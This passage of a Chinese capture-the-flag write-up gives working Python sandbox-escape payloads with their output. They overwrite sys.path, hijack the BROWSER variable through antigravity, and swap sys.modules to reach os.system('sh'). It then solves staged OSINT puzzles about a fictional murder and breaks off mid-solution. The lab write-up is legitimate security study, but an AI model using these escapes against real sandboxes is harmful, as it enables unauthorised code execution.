+If <span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> your first time <span class="hljs-keyword">using</span> Python, you should definitely check <span class="hljs-keyword">out</span>
+the tutorial <span class="hljs-keyword">on</span> the Internet at https:<span class="hljs-comment">//docs.python.org/3.8/tutorial/.</span>
+
+Enter the name of any module, keyword, <span class="hljs-keyword">or</span> topic to <span class="hljs-keyword">get</span> help <span class="hljs-keyword">on</span> writing
+Python programs <span class="hljs-keyword">and</span> <span class="hljs-keyword">using</span> Python modules.  To quit <span class="hljs-keyword">this</span> help utility <span class="hljs-keyword">and</span>
+<span class="hljs-keyword">return</span> to the interpreter, just type <span class="hljs-string">&quot;quit&quot;</span>.
+
+To <span class="hljs-keyword">get</span> a list of available modules, keywords, symbols, <span class="hljs-keyword">or</span> topics, type
+<span class="hljs-string">&quot;modules&quot;</span>, <span class="hljs-string">&quot;keywords&quot;</span>, <span class="hljs-string">&quot;symbols&quot;</span>, <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;topics&quot;</span>.  Each module also comes
+<span class="hljs-keyword">with</span> a one-line summary of what it does; to list the modules whose name
+<span class="hljs-keyword">or</span> summary contain a given <span class="hljs-built_in">string</span> such <span class="hljs-keyword">as</span> <span class="hljs-string">&quot;spam&quot;</span>, type <span class="hljs-string">&quot;modules spam&quot;</span>.
+
+help&gt; os
+[<span class="hljs-meta">Errno 2</span>] No usable temporary directory found <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;/tmp&#x27;</span>, <span class="hljs-string">&#x27;/var/tmp&#x27;</span>, <span class="hljs-string">&#x27;/usr/tmp&#x27;</span>, <span class="hljs-string">&#x27;/home/user&#x27;</span>]</code></pre><h4 id="方法2-修改syspath写文件后再import"><a class="header-link" href="#方法2-修改syspath写文件后再import"></a>方法2 修改sys.path,写文件后再import:</h4>
+<p>其由以下几个部分组成</p>
+<ol class="list">
+<li>通过<code>setattr</code>覆盖<code>sys.path</code>的属性,覆盖为可写的<code>/dev/shm</code></li>
+<li>然后通过<code>print</code>函数的<code>file</code>参数 <code>https://blog.csdn.net/no_giveup/article/details/72017925</code>,然后用open来打开并且去写,<code>.</code>用<code>chr(46)</code>代替和拼接.</li>
+<li>使用<code>__import__</code>加载写入的文件名,然后执行代码</li>
+</ol>
+<p>其分别为</p>
+<ol class="list">
+<li><code>setattr(__import__(&quot;sys&quot;), &quot;path&quot;, list((&quot;/dev/shm/&quot;,)))</code></li>
+<li><code>print(&quot;import os&quot; + chr(10) + &quot;print(os&quot; + chr(46) + &quot;system(&#39;/readflag giveflag&#39;))&quot;, file=open(&quot;/dev/shm/exp&quot; + chr(46) + &quot;py&quot;, &quot;w&quot;))</code></li>
+<li><code>__import__(&quot;exp&quot;)</code></li>
+</ol>
+<p>组合成payload:</p>
+<pre class="hljs"><code>(<span class="hljs-built_in">setattr</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;sys&quot;</span>), <span class="hljs-string">&quot;path&quot;</span>, <span class="hljs-built_in">list</span>((<span class="hljs-string">&quot;/dev/shm/&quot;</span>,))), <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;import os&quot;</span> + <span class="hljs-built_in">chr</span>(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;print(os&quot;</span> + <span class="hljs-built_in">chr</span>(<span class="hljs-number">46</span>) + <span class="hljs-string">&quot;system(&#x27;/readflag giveflag&#x27;))&quot;</span>, file=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/shm/exp&quot;</span> + <span class="hljs-built_in">chr</span>(<span class="hljs-number">46</span>) + <span class="hljs-string">&quot;py&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)), <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;exp&quot;</span>))</code></pre><p>结果:</p>
+<pre class="hljs"><code>welcome!
+<span class="hljs-meta">&gt;&gt;&gt; </span>(<span class="hljs-built_in">setattr</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;sys&quot;</span>), <span class="hljs-string">&quot;path&quot;</span>, <span class="hljs-built_in">list</span>((<span class="hljs-string">&quot;/dev/shm/&quot;</span>,))), <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;import os&quot;</span> + <span class="hljs-built_in">chr</span>(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;print(os&quot;</span> + <span class="hljs-built_in">chr</span>(<span class="hljs-number">46</span>) + <span class="hljs-string">&quot;system(&#x27;/readflag giveflag&#x27;))&quot;</span>, file=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/shm/exp&quot;</span> + <span class="hljs-built_in">chr</span>(<span class="hljs-number">46</span>) + <span class="hljs-string">&quot;py&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)), <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;exp&quot;</span>))
+idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!}
+<span class="hljs-number">0</span>
+(<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, &lt;module <span class="hljs-string">&#x27;lol&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/dev/shm/exp.py&#x27;</span>&gt;)</code></pre><p>当然应该是环境问题导致的情况,其远程环境的<code>/tmp</code>是只读的,但是其实应该可写.其上述路径如果在<code>tmp</code>可写的话也可以完成相关的payload.</p>
+<h4 id="方法3-antigravity劫持browser环境变量"><a class="header-link" href="#方法3-antigravity劫持browser环境变量"></a>方法3 antigravity劫持BROWSER环境变量:</h4>
+<p>并且<code>antigravity</code>可以从这里看出<a href="https://towardsdatascience.com/7-easter-eggs-in-python-7765dc15a203">https://towardsdatascience.com/7-easter-eggs-in-python-7765dc15a203</a></p>
+<p>本解法来自于作者的预期解,本题很有意思.利用<code>setattr</code>覆盖到<code>os.environ</code>中的环境变量<code>BROWSER</code> 从而可以执行.跟踪一下
+<a href="https://github.com/python/cpython/blob/main/Lib/antigravity.py">https://github.com/python/cpython/blob/main/Lib/antigravity.py</a></p>
+<pre class="hljs"><code><span class="hljs-keyword">import</span> webbrowser
+<span class="hljs-keyword">import</span> hashlib
+
+webbrowser.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;https://xkcd.com/353/&quot;</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geohash</span>(<span class="hljs-params">latitude, longitude, datedow</span>):</span>
+    <span class="hljs-string">&#x27;&#x27;&#x27;Compute geohash() using the Munroe algorithm.
+    &gt;&gt;&gt; geohash(37.421542, -122.085589, b&#x27;2005-05-26-10458.68&#x27;)
+    37.857713 -122.544543
+    &#x27;&#x27;&#x27;</span>
+    <span class="hljs-comment"># https://xkcd.com/426/</span>
+    h = hashlib.md5(datedow, usedforsecurity=<span class="hljs-literal">False</span>).hexdigest()
+    p, q = [(<span class="hljs-string">&#x27;%f&#x27;</span> % <span class="hljs-built_in">float</span>.fromhex(<span class="hljs-string">&#x27;0.&#x27;</span> + x)) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> (h[:<span class="hljs-number">16</span>], h[<span class="hljs-number">16</span>:<span class="hljs-number">32</span>])]
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%d%s %d%s&#x27;</span> % (latitude, p[<span class="hljs-number">1</span>:], longitude, q[<span class="hljs-number">1</span>:]))</code></pre><p>发现其调用了<code>webbrowser</code>,继续跟踪一下
+可以从这里看到open函数里存在<code>register_standard_browsers</code> <a href="https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L84">https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L84</a></p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">open</span>(<span class="hljs-params">url, new=<span class="hljs-number">0</span>, autoraise=<span class="hljs-literal">True</span></span>):</span>
+    <span class="hljs-string">&quot;&quot;&quot;Display url using the default browser.
+    If possible, open url in a location determined by new.
+    - 0: the same browser window (the default).
+    - 1: a new browser window.
+    - 2: a new browser page (&quot;tab&quot;).
+    If possible, autoraise raises the window (the default) or not.
+    &quot;&quot;&quot;</span>
+    <span class="hljs-keyword">if</span> _tryorder <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
+        <span class="hljs-keyword">with</span> _lock:
+            <span class="hljs-keyword">if</span> _tryorder <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
+                register_standard_browsers()
+    <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> _tryorder:
+        browser = get(name)
+        <span class="hljs-keyword">if</span> browser.<span class="hljs-built_in">open</span>(url, new, autoraise):
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></code></pre><p>继续跟踪<code>register_standard_browsers</code>可以发现其检查了<code>os.environ</code>中的<code>BROWSER</code>环境变量
+<a href="https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L585">https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L585</a></p>
+<pre class="hljs"><code>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;BROWSER&quot;</span> <span class="hljs-keyword">in</span> os.environ:
+        userchoices = os.environ[<span class="hljs-string">&quot;BROWSER&quot;</span>].split(os.pathsep)
+        userchoices.reverse()
+
+        <span class="hljs-comment"># Treat choices in same way as if passed into get() but do register</span>
+        <span class="hljs-comment"># and prepend to _tryorder</span>
+        <span class="hljs-keyword">for</span> cmdline <span class="hljs-keyword">in</span> userchoices:
+            <span class="hljs-keyword">if</span> cmdline != <span class="hljs-string">&#x27;&#x27;</span>:
+                cmd = _synthesize(cmdline, preferred=<span class="hljs-literal">True</span>)
+                <span class="hljs-keyword">if</span> cmd[<span class="hljs-number">1</span>] <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
+                    register(cmdline, <span class="hljs-literal">None</span>, GenericBrowser(cmdline), preferred=<span class="hljs-literal">True</span>)</code></pre><p>其中<code>GenericBrowser</code>可以运行cmdline <a href="https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L181">https://github.com/python/cpython/blob/main/Lib/webbrowser.py#L181</a></p>
+<pre class="hljs"><code><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GenericBrowser</span>(<span class="hljs-params">BaseBrowser</span>):</span>
+    <span class="hljs-string">&quot;&quot;&quot;Class for all browsers started with a command
+       and without remote functionality.&quot;&quot;&quot;</span>
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, name</span>):</span>
+        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(name, <span class="hljs-built_in">str</span>):
+            self.name = name
+            self.args = [<span class="hljs-string">&quot;%s&quot;</span>]
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-comment"># name should be a list with arguments</span>
+            self.name = name[<span class="hljs-number">0</span>]
+            self.args = name[<span class="hljs-number">1</span>:]
+        self.basename = os.path.basename(self.name)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">open</span>(<span class="hljs-params">self, url, new=<span class="hljs-number">0</span>, autoraise=<span class="hljs-literal">True</span></span>):</span>
+        sys.audit(<span class="hljs-string">&quot;webbrowser.open&quot;</span>, url)
+        cmdline = [self.name] + [arg.replace(<span class="hljs-string">&quot;%s&quot;</span>, url)
+                                 <span class="hljs-keyword">for</span> arg <span class="hljs-keyword">in</span> self.args]
+        <span class="hljs-keyword">try</span>:
+            <span class="hljs-keyword">if</span> sys.platform[:<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;win&#x27;</span>:
+                p = subprocess.Popen(cmdline)
+            <span class="hljs-keyword">else</span>:
+                p = subprocess.Popen(cmdline, close_fds=<span class="hljs-literal">True</span>)
+            <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> p.wait()
+        <span class="hljs-keyword">except</span> OSError:
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></code></pre><p>最后exp:</p>
+<pre class="hljs"><code><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;antigravity&#x27;</span>,<span class="hljs-built_in">setattr</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>),<span class="hljs-string">&#x27;environ&#x27;</span>,<span class="hljs-built_in">dict</span>(BROWSER=<span class="hljs-string">&#x27;/bin/sh -c &quot;/readflag giveflag&quot; #%s&#x27;</span>)))</code></pre><h4 id="方法4-通过恢复sysmodules让__import__加载getattr生效"><a class="header-link" href="#方法4-通过恢复sysmodules让__import__加载getattr生效"></a>方法4 通过恢复sys.modules,让__import__加载getattr生效:</h4>
+<p>由于<code>__import__</code>在加载的时候会先找<code>sys.modules</code>--&gt;<code>https://github.com/python/cpython/blob/48ec678287a3be1539823fa3fc0ef457ece7e1c6/Lib/importlib/_bootstrap.py#L1101</code>,所以可以先通过<code>setattr</code>覆盖<code>sys.modules</code>为<code>__builtins__</code>,这样<code>__import__</code>即可调用<code>getattr</code>.通过<code>getattr</code>可以来加载<code>os.system</code>.由于<code>.</code>被ban了所以可以用<code>__import__(&#39;os&#39;),&#39;system&#39;</code>.然后传参<code>&#39;sh&#39;</code>即可</p>
+<pre class="hljs"><code><span class="hljs-built_in">setattr</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>),<span class="hljs-string">&#x27;modules&#x27;</span>,__builtins__) <span class="hljs-keyword">or</span> <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;getattr&#x27;</span>)(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>),<span class="hljs-string">&#x27;system&#x27;</span>)(<span class="hljs-string">&#x27;sh&#x27;</span>)</code></pre><h2 id="osint"><a class="header-link" href="#osint"></a>OSINT:</h2>
+<h3 id="osint-crime-confusion-1-w-as-in-where"><a class="header-link" href="#osint-crime-confusion-1-w-as-in-where"></a>Osint Crime Confusion 1: W as in Where</h3>
+<pre class="hljs"><code>Someone has died unexpectedly. The police <span class="hljs-keyword">is</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">it</span>, <span class="hljs-keyword">but</span> <span class="hljs-keyword">between</span> you <span class="hljs-keyword">and</span> <span class="hljs-keyword">me</span>, I cannot wait <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> police. I am a private investigator <span class="hljs-keyword">and</span> I need your help. Unfortunately, we might be tracked so I cannot give you <span class="hljs-keyword">the</span> information directly. Start <span class="hljs-keyword">in</span> a major social network. Certainly <span class="hljs-keyword">not</span> a problem <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> best hacker I know right...? Alright here goes a beautiful poem:
+
+Some people <span class="hljs-keyword">in</span> weird ways were connected
+Some were a triangle, <span class="hljs-keyword">some</span> were less directed
+For one night they all met
+At doctor&#x27;s Jonathan Abigdail <span class="hljs-keyword">the</span> <span class="hljs-keyword">third</span> they wept 
+Things were said, threats <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> air
+A few days later someone <span class="hljs-keyword">is</span> dead
+Who <span class="hljs-keyword">is</span> <span class="hljs-keyword">that</span> someone? That <span class="hljs-keyword">is</span> <span class="hljs-keyword">for</span> you <span class="hljs-keyword">to</span> find,
+Also who <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> killer, <span class="hljs-keyword">if</span> you really don&#x27;t mind.
+
+Note <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> all <span class="hljs-keyword">the</span> challenges: The challenge <span class="hljs-keyword">is</span> divided <span class="hljs-keyword">into</span> three challenges: Where, Weapon, <span class="hljs-keyword">and</span> Who. Where <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> one <span class="hljs-keyword">the</span> others will come later. In each one you can find <span class="hljs-keyword">the</span> flag somwhere online. You might find <span class="hljs-keyword">the</span> information <span class="hljs-keyword">in</span> any order, however <span class="hljs-keyword">the</span> expected order <span class="hljs-keyword">is</span>: Where, Weapon <span class="hljs-keyword">and</span> Who. Example: If <span class="hljs-keyword">the</span> answer <span class="hljs-keyword">is</span> knife <span class="hljs-keyword">then</span> when you would discover <span class="hljs-keyword">that</span> somewhere: like <span class="hljs-string">&quot;the killer used a idek{knife_V5478G}&quot;</span> <span class="hljs-keyword">or</span> instructions <span class="hljs-keyword">on</span> how <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> <span class="hljs-keyword">the</span> flag: like <span class="hljs-string">&quot;idek{weaponUsed_V5478G}}&quot;</span>. The flag would <span class="hljs-keyword">then</span> be idek{knife_V5478G}.</code></pre><p>本题在线索提示中写道<code>At doctor&#39;s Jonathan Abigdail the third they wept</code> 其关键词是<code>Jonathan Abigdail</code>找到一个ins</p>
+<p><a href="https://www.instagram.com/abigdail3djohn/">https://www.instagram.com/abigdail3djohn/</a></p>
+<p class="img-container"><img src="https://i.imgur.com/olZqGoN.png" alt=""></p>
+<p>ins推文:</p>
+<pre class="hljs"><code>The EYE
+Now imagin you could INK IT!
+That is <span class="hljs-literal">right</span>, <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> famous convention <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> eye yours truly is presenting!
+Hopefully reunited <span class="hljs-keyword">with</span> <span class="hljs-keyword">a</span> lot <span class="hljs-keyword">of</span> old friends <span class="hljs-built_in">to</span> see <span class="hljs-keyword">it</span>!
+The hashtag is <span class="hljs-comment">#TheEye12tothe3isthekeytoBEyousee?</span>
+Get HYPEEEED</code></pre><p>然后点击<code>#TheEye12tothe3isthekeytoBEyousee</code>
+可以找到<a href="https://www.instagram.com/hjthepainteng/">https://www.instagram.com/hjthepainteng/</a> 账户 
+之后我们可以看到了一件关键的推文</p>
+<pre class="hljs"><code>I do <span class="hljs-keyword">not</span> know what happened, only <span class="hljs-number">3</span> days <span class="hljs-keyword">after</span> <span class="hljs-keyword">that</span> stupid eye convention you appear dead. Only <span class="hljs-keyword">if</span> there was someone <span class="hljs-keyword">that</span> could find what happened. I only hope you know <span class="hljs-keyword">that</span> you died somewhere <span class="hljs-keyword">after</span> <span class="hljs-keyword">the</span> best performance ever <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> great_paintball_portugal competition. I <span class="hljs-built_in">write</span> this still there, arranging <span class="hljs-keyword">for</span> moving your body <span class="hljs-keyword">back</span> home. Farewell. I love you. Also they said they would sell something <span class="hljs-keyword">on</span> ebay <span class="hljs-keyword">for</span> you &lt;<span class="hljs-number">3</span></code></pre><p>其中可以看到一些关键字<code>great_paintball_portugal</code>以及<code>ebay</code>的提示</p>
+<p>可以通过<a href="https://whatsmyname.app/">https://whatsmyname.app/</a></p>
+<p>得到链接 <a href="https://www.ebay.com/usr/great_paintball_portugal">https://www.ebay.com/usr/great_paintball_portugal</a></p>
+<pre class="hljs"><code>About
+So <span class="hljs-keyword">after</span> <span class="hljs-keyword">the</span> death we actually decided instead <span class="hljs-keyword">of</span> selling just <span class="hljs-built_in">to</span> make <span class="hljs-keyword">a</span> little rip <span class="hljs-built_in">post</span> <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>: franparrefrancisco.wixsite.com/great-paintball-pt. We <span class="hljs-built_in">do</span> <span class="hljs-keyword">not</span> want <span class="hljs-keyword">the</span> blog <span class="hljs-built_in">post</span> <span class="hljs-built_in">to</span> be very obvious though because <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> publicity.
+Location: PortugalMember since: May <span class="hljs-number">12</span>, <span class="hljs-number">2022</span></code></pre><p><a href="https://franparrefrancisco.wixsite.com/great-paintball-pt">https://franparrefrancisco.wixsite.com/great-paintball-pt</a></p>
+<p>由于是一个<code>blog</code>形式可以fuzzing尝试一些参数,比如<code>/post</code>然后即可看到</p>
+<p><a href="https://franparrefrancisco.wixsite.com/great-paintball-pt/post">https://franparrefrancisco.wixsite.com/great-paintball-pt/post</a></p>
+<p class="img-container"><img src="https://imgur.com/9j4cWMx.png" alt=""></p>
+<p>点<code>See More Posts</code>,可以看到
+<a href="https://franparrefrancisco.wixsite.com/great-paintball-pt/blog">https://franparrefrancisco.wixsite.com/great-paintball-pt/blog</a></p>
+<p class="img-container"><img src="https://imgur.com/4Hcjydy.png" alt=""></p>
+<p>点击<a href="https://franparrefrancisco.wixsite.com/great-paintball-pt/post/great-paintball-portugal-death-heather-james">https://franparrefrancisco.wixsite.com/great-paintball-pt/post/great-paintball-portugal-death-heather-james</a></p>
+<p class="img-container"><img src="https://imgur.com/lDazL6l.png" alt=""></p>
+<p>可以拿到第一部分flag</p>
+<pre class="hljs"><code>Death <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> Great Paintball Portugal <span class="hljs-keyword">of</span> Heather James
+Yes, we are sad <span class="hljs-keyword">to</span> confirm <span class="hljs-keyword">that</span> yesterday one athlete <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">name</span> Heather James was killed. Authorities are investigating <span class="hljs-keyword">as</span> we speak <span class="hljs-keyword">as</span> are YOU, <span class="hljs-keyword">the</span> reader, I hope.
+We confirm <span class="hljs-keyword">that</span> <span class="hljs-keyword">it</span> was indeed here <span class="hljs-keyword">at</span> idek{TGPP_WCIYD}.</code></pre><p>可以拿到flag --&gt; <code>idek{TGPP_WCIYD}</code></p>
+<h3 id="osint-crime-confusion-2-w-as-in-weapon"><a class="header-link" href="#osint-crime-confusion-2-w-as-in-weapon"></a>Osint Crime Confusion 2: W as in Weapon</h3>
+<pre class="hljs"><code>Now that you found where, can you <span class="hljs-keyword">help</span> <span class="hljs-keyword">me</span> <span class="hljs-keyword">find</span> what was the weapon of the crime? It <span class="hljs-built_in">has</span> something <span class="hljs-keyword">to</span> <span class="hljs-keyword">do</span> with <span class="hljs-keyword">a</span> university of science.
+Note: Previous links <span class="hljs-built_in">or</span> accounts might <span class="hljs-keyword">be</span> usefull.</code></pre><p>通过<a href="https://www.instagram.com/hjthepainteng/">https://www.instagram.com/hjthepainteng/</a> 的info可以拿到这些信息</p>
+<pre class="hljs"><code>Heather <span class="hljs-keyword">James
+</span>Mechanical Engineer
+Love Paintball
+Study <span class="hljs-keyword">and </span>Teached <span class="hljs-keyword">blue </span><span class="hljs-keyword">birds </span><span class="hljs-built_in">at</span> the University of Dutch ThE of Topics in <span class="hljs-keyword">Science </span>(UThE_TS)</code></pre><p><code>blue brids</code>可能是推特 然后可以搜到相关的账户 <code>@UThE_TS</code>--&gt; <a href="https://twitter.com/UThE_TS">https://twitter.com/UThE_TS</a></p>
+<pre class="hljs"><code>http<span class="hljs-variable">s:</span>//twitter.<span class="hljs-keyword">com</span>/UThE_TS/status/<span class="hljs-number">1610041133463371776</span>
+The <span class="hljs-keyword">new</span> dutch university <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> science topics <span class="hljs-built_in">has</span> arrived! Stay tuned!
+
+http<span class="hljs-variable">s:</span>//twitter.<span class="hljs-keyword">com</span>/UThE_TS/status/<span class="hljs-number">1610041337671290880</span>
+First order of busines<span class="hljs-variable">s:</span> Will release <span class="hljs-keyword">a</span> link <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> review of our brightest students from past years <span class="hljs-keyword">as</span> well <span class="hljs-keyword">as</span> the BIGGEST scandals! You will not want <span class="hljs-keyword">to</span> miss it!
+
+http<span class="hljs-variable">s:</span>//twitter.<span class="hljs-keyword">com</span>/UThE_TS/status/<span class="hljs-number">1611392544008732672</span>
+It <span class="hljs-built_in">has</span> been released great!</code></pre><p>可以拿到删除的推文<a href="https://web.archive.org/details/https://twitter.com/UThE_TS/status/1612383535549059076,并且可以得知`potatoes">https://web.archive.org/details/https://twitter.com/UThE_TS/status/1612383535549059076,并且可以得知`potatoes</a> eating camels`是凶手</p>
+<pre class="hljs"><code>https:<span class="hljs-regexp">//</span>web.archive.org<span class="hljs-regexp">/web/</span><span class="hljs-number">20230109094239</span><span class="hljs-regexp">/https:/</span><span class="hljs-regexp">/twitter.com/</span>UThE_TS<span class="hljs-regexp">/status/</span><span class="hljs-number">1612383535549059076</span>
+Remember that weird student that wrote about potatoes eating camels? AHAHAH Maybe she is the killer</code></pre><p>查看列表</p>
+<p class="img-container"><img src="https://imgur.com/GyRMoEf.png" alt=""></p>
+<p class="img-container"><img src="https://imgur.com/gLMRp4I.png" alt=""></p>
+<p class="img-container"><img src="https://imgur.com/RrqdJP3.png" alt=""></p>
+<pre class="hljs"><code>The List Test
+Look <span class="hljs-keyword">in</span> the german chaos pad: <span class="hljs-regexp">/ep/</span>pad<span class="hljs-regexp">/view/</span>ro.lvGC01KAJWI/rev.<span class="hljs-number">354</span></code></pre><p>Google chaospad 然后第一个就是
+<a href="https://pads.ccc.de/ep/pad/view/ro.lvGoC01KAJWI/rev.354/">https://pads.ccc.de/ep/pad/view/ro.lvGoC01KAJWI/rev.354/</a></p>
+<p>右上角播放</p>
+<pre class="hljs"><code>Now, <span class="hljs-keyword">in</span> ThE University there have been so many great <span class="hljs-keyword">and</span> admirable students.
+ 
+There was the great philosopher IfyouSun YouTzu <span class="hljs-literal">that</span> did a great thing <span class="hljs-keyword">for</span> octopus rights <span class="hljs-keyword">in</span> the netherlands.
+ 
+Also the great mathematician Isthat Newtoyou <span class="hljs-literal">that</span> discovered pravity the opposed forced <span class="hljs-keyword">to</span> gravity.
+ 
+No one was here Of course <span class="hljs-keyword">if</span> you find who was, remember <span class="hljs-literal">that</span> tthe   <span class="hljs-number">4</span> initials <span class="hljs-keyword">of</span> the object plus  <span class="hljs-string">&quot;_X!<span class="hljs-subst">#$</span>&quot;</span> <span class="hljs-keyword">is</span> the key ( idek{<span class="hljs-number">4</span>CapitalLetters_X!<span class="hljs-comment">#$}.</span>
+ 
+Also, there was the great astronomer Carl Segway, who discovered Earth again!</code></pre><p>然后翻历史版本可以翻到</p>
+<pre class="hljs"><code>One great <span class="hljs-literal">one</span> was Heather James <span class="hljs-keyword">the</span> great student <span class="hljs-keyword">and</span> teacher who has recently deceased sadly :( but that is ok-
+We <span class="hljs-built_in">do</span> have <span class="hljs-keyword">a</span> theory <span class="hljs-built_in">to</span> what killed because something has been missing (
+HUBBLE <span class="hljs-literal">SPACE</span> TELESCOPE MODEL, BY PENWAL INDUSTRIES FOR NASA, CA <span class="hljs-number">1990</span>) ah shit <span class="hljs-built_in">delete</span> <span class="hljs-built_in">delete</span>
+ but maybe I should <span class="hljs-keyword">not</span> have said <span class="hljs-keyword">it</span> here. Let me <span class="hljs-built_in">delete</span> <span class="hljs-keyword">it</span>. Done. Great that these days these things are easy <span class="hljs-built_in">to</span> clean up.</code></pre><p>凶器是<code>HUBBLE SPACE TELESCOPE MODEL</code>,取四个大写字母</p>
+<p>最后可以得到flag --&gt; <code>idek{HSTM_X!#$}</code></p>
+<h3 id="osint-crime-confusion-3-w-as-in-who"><a class="header-link" href="#osint-crime-confusion-3-w-as-in-who"></a>Osint Crime Confusion 3: W as in Who</h3>
+<pre class="hljs"><code>I feel <span class="hljs-keyword">the</span> killer might be dangerous so I have <span class="hljs-keyword">some</span> info <span class="hljs-keyword">to</span> give you <span class="hljs-keyword">but</span> I don&#x27;t want <span class="hljs-keyword">to</span> disclose <span class="hljs-keyword">my</span> email just like <span class="hljs-keyword">that</span>. So find <span class="hljs-keyword">my</span> review <span class="hljs-keyword">from</span> <span class="hljs-keyword">the</span> image <span class="hljs-keyword">below</span> <span class="hljs-keyword">and</span> send <span class="hljs-keyword">me</span> an email asking <span class="hljs-keyword">for</span> info. Be creative <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> signature so I know <span class="hljs-keyword">its</span> you. It <span class="hljs-keyword">is</span> <span class="hljs-built_in">time</span> <span class="hljs-keyword">to</span> find Who <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> killer.</code></pre><p>通过附件给的图片 可以得到</p>
+<p><a href="https://www.alfaiatedinteriores.pt/site/pt/lojas-fabrica/">https://www.alfaiatedinteriores.pt/site/pt/lojas-fabrica/</a></p>
+<p>Av. do Brasil 363 4150-376 Porto, Portugal</p>
+<p>可以看到</p>
+<pre class="hljs"><code>O melhor alfaite da zona! Rende a vinda! Tinha me pedido o email para mais informações! Aqui vai: noodlesareramhackers at gmail dot com</code></pre><p>通过gmail可以搜到github</p>
+<p><a href="https://github.com/potatoes-eating-camels/potatoes-eating-camels/wiki">https://github.com/potatoes-eating-camels/potatoes-eating-camels/wiki</a></p>
+<p>此外也验证了2中提到的信息<code>potatoes eating camels</code>是凶手</p>
+<p>项目里的README.md写着</p>
+<pre class="hljs"><code>Hi there 👋
+👋 Hi, I’m @potatoes-eating-camels
+👀 I’m interested in Kill.. I mean giving love to the wooooorld!
+🌱 I’m currently learning about weapons
+💞️ I’m looking to collaborate on not being found by the police.
+👀 I&#x27;m still improving wiki.
+-<span class="hljs-string">.--</span> <span class="hljs-params">---</span> <span class="hljs-string">..-</span>
+<span class="hljs-string">.-.</span> . <span class="hljs-string">.-</span> <span class="hljs-string">.-..</span> <span class="hljs-string">.-..</span> -<span class="hljs-string">.--</span>
+-<span class="hljs-string">..</span> <span class="hljs-params">---</span>
+- <span class="hljs-string">....</span> <span class="hljs-string">..</span> -. -<span class="hljs-string">.-</span>
+<span class="hljs-string">..</span>
+<span class="hljs-string">.--</span> <span class="hljs-params">---</span> <span class="hljs-string">..-</span> <span class="hljs-string">.-..</span> -<span class="hljs-string">..</span>
+--. <span class="hljs-string">..</span> <span class="hljs-string">...-</span> .</code></pre><p>morse解完是无用信息 然后可以注意wiki部分 访问<a href="https://github.com/potatoes-eating-camels/potatoes-eating-camels/wiki">https://github.com/potatoes-eating-camels/potatoes-eating-camels/wiki</a></p>
+<p>可以看到</p>
